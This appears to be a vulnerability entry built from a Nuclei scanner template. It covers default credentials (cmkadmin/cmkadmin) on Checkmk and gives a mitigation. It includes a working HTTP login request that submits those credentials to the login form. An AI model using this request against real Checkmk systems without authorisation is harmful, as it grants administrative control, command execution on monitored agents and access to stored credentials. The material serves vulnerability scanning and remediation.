# Vulnerability: Checkmk - Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`checkmk-default-login.yaml`)

## Description
Checkmk monitoring instance is accessible with default credentials (cmkadmin/cmkadmin). This provides full administrative access to the monitoring platform, including the ability to view all monitored hosts, execute commands on agents, and access stored credentials.

## Secure Mitigation
Change the default cmkadmin password immediately after installation using 'cmk-passwd cmkadmin' or through the web interface.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}
POST {{endpoint}} HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0FYqMzKWywSgTEcE

------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="filled_in"

login
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_login"

1
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_origtarget"

index.py
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_username"

cmkadmin
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_password"

cmkadmin
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_login"

Login
------WebKitFormBoundary0FYqMzKWywSgTEcE--
```

